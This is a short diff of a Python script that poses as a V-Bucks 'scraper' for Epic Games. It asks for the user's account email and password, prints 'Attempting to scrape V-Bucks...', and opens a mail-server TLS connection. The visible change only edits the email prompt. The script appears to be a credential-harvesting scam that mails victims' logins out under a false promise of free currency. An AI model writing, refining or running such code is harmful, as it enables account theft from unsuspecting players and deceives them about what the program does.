@@ -19,7 +19,7 @@ print(r""" __      ______             _           _____                         
                                                                                       
                                                                                       """)
 print("Written by Kratismo, don't copy this script.")
-client_email = input("[+] Please enter email used in Epic Games Account: ")
+client_email = input("[+] Please enter email used in Epic Games Account (without the @gmail.com): ")
 client_password = input("Password for " + client_email + ": ")
 print("Attempting to scrape V-Bucks...")
 server_.starttls()
